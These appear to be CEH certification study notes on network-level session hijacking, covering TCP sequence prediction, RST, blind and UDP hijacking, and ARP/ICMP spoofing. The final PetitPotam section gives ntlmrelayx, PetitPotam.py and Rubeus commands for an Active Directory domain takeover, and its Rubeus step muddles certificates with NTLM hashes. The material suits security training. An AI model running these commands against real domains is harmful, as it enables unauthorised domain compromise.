# 🛡️ 3. Network-Level Session Hijacking
### CEH v13 · Module 11: Session Hijacking — OBJECTIVE 03

> **ℹ️ About these Notes**
> Network-level hijacking targets the **Transport and Internet protocols (TCP/UDP)**. Attackers heavily favor network-level hijacking because it does not require host access (unlike host-level hijacking) and it doesn't need to be custom-tailored to specific web applications. Once the network stream is hijacked, application-level attacks become trivial.

## 1. The Foundation: TCP 3-Way Handshake

To understand network hijacking, one must understand how TCP establishes a connection. 

1. **SYN:** The client initiates the connection by sending an Initial Sequence Number (ISN) with the SYN flag set. Client state: `SYN-SENT`. Server state: `LISTEN`.
2. **SYN-ACK:** The server acknowledges the client's sequence number and sends its own ISN with the SYN flag set. Server state: `SYN-RECEIVED`.
3. **ACK:** The client acknowledges the server's sequence number by incrementing it and setting the ACK flag. Client state: `ESTABLISHED`.

**Why it matters to attackers:**
For three parties to communicate, the IP address, Port numbers, and Sequence numbers are required. IPs and Ports don't change and are easily sniffed. Sequence numbers *do* change. If the attacker can successfully guess or predict the next Sequence/ACK numbers, they can spoof Bob's address and take over the communication.

## 2. TCP/IP Hijacking

In TCP/IP hijacking, the attacker intercepts an established connection using spoofed packets and redirects the TCP traffic to their own machine. 
* **Requirement:** The victim and attacker must be on the **same network** (local segment) so the attacker can sniff traffic.

**Execution Steps:**
1. Attacker sniffs the victim's connection to capture the current sequence numbers.
2. Attacker spoofs the victim's IP address and sends a packet to the server with the predicted sequence number.
3. The server processes the spoofed packet, increments the sequence number, and sends an ACK back to the *victim's* true IP address.
4. The victim's machine, unaware of the spoofed packet, receives an unexpected ACK and ignores it, turning off its sequence number count.
5. The connection enters a **desynchronized state**.
6. The victim's connection hangs, while the attacker continuously spoofs packets and communicates with the server as the victim.

## 3. IP Spoofing & Source Routing

### Source Routed Packets
**Source Routing** is a process that allows the sender of a packet to specify the exact path (the routers) the IP packet must take to reach its destination. 

**The Attack:**
1. The attacker spoofs a trusted host's IP address.
2. The attacker enables source routing so that the server's replies follow the attacker's specified path (routing the traffic directly past the attacker's sniffer).
3. The attacker alters the sequence and acknowledgment numbers.
4. The attacker injects forged packets into the TCP session before the client can respond.
5. The original packets are lost, the connection desynchronizes, and the attacker takes over.

## 4. RST & Blind Hijacking

### RST Hijacking
The attacker injects an authentic-looking Reset (RST) packet using a spoofed source IP and an accurately predicted acknowledgment number. 
* The victim believes the server sent the reset packet and abruptly closes the connection.
* **Tools:** Colasoft Packet Builder, tcpdump.

### Blind Hijacking
The attacker injects malicious data/commands into intercepted communications in a TCP session, *even if the victim has disabled source routing*.
* Because source routing is off, the attacker **cannot view the response** from the server (hence "blind").
* The attacker must perfectly guess the ISN.
* **Use Case:** Sending a blind command (like a password reset or firewall rule change) to allow access from another location. MITM is usually preferred because you can actually see the output.

## 5. UDP Hijacking

**Why it's dangerous:** UDP is a connectionless protocol. It does **not** use packet sequencing or synchronizing (no 3-way handshake). This makes a UDP session significantly easier to attack and modify without the victim noticing.

**How it works:**
1. **Spoofing:** The attacker sends UDP packets with a spoofed source IP address.
2. **Intercepting:** The attacker forges a server reply to a client UDP request *before the real server can respond*. 
3. **Manipulating:** The attacker inserts false information into the data stream.
* If sniffing is used (MITM), the attacker can physically block the real server's reply from ever reaching the client in the first place.

## 6. MITM using Forged ICMP & ARP Spoofing

Attackers alter the default gateway of the client's machine to reroute all packets through the attacker's machine using two techniques:

### Forged ICMP (Internet Control Message Protocol)
* ICMP is an extension of IP used to send error messages.
* The attacker sends forged ICMP error messages indicating there are problems routing packets through the original connection path.
* This fools both the server and the client into altering their routing tables and sending their traffic through the attacker's path instead.

### ARP Spoofing
* Address Resolution Protocol (ARP) maps IP addresses to physical MAC addresses.
* The attacker broadcasts forged ARP replies indicating that the attacker's MAC address belongs to the legitimate IP address.
* The host's ARP tables update automatically, routing all local traffic to the attacker's machine instead of the legitimate router.

## 7. PetitPotam Hijacking (Active Directory)

**PetitPotam** is a devastating attack where an attacker forces a Windows Domain Controller (DC) to authenticate to the attacker's server. 

* **Mechanism:** The attacker uses Microsoft's Encrypting File System Remote Protocol **(MS-EFSRPC)** API call to hijack an authentication session. 
* **Goal:** Force the DC to share its **NTLM hash**. The attacker relays this hash to the Active Directory Certificate Services (AD CS) to generate an administrative certificate, taking full control over the entire domain.

### Execution Steps & Commands (EC-Council Framework):
1. **Identify the Certificate Authority:** `certutil.exe`
2. **Set up SMB/HTTP Configuration:** Use Impacket to capture credentials from the DC.
   ```bash
   ntlmrelayx.py -t <URL of Certificate authority with web enrolment> -smb2support --adcs --template DomainController
   ```
3. **Force Authentication (Coerce the DC):** Use the `EfsRpcOpenFileRaw` command from the MS-EFSRPC API to initiate the attack.
   ```bash
   python3 PetitPotam.py -d <CA name> -u <Username> -p <Password> <Listener-IP> <IP of DC>
   ```
   *(Note: This can be launched without credentials if the DC is unpatched/vulnerable: `python3 PetitPotam.py <Attacker's IP> <IP of DC>`)*
4. **Crack the Hash / Request Ticket:** After obtaining the NTLM hashes of the certificate, use a tool like **Rubeus** to request a Kerberos ticket for domain dominance.
   ```bash
   Rubeus.exe asktgt /outfile.kirbi /dc:<DC-IP> /domain:<domain name> /user:<Domain username> /ptt /certificate:<NTLM hash>
   ```
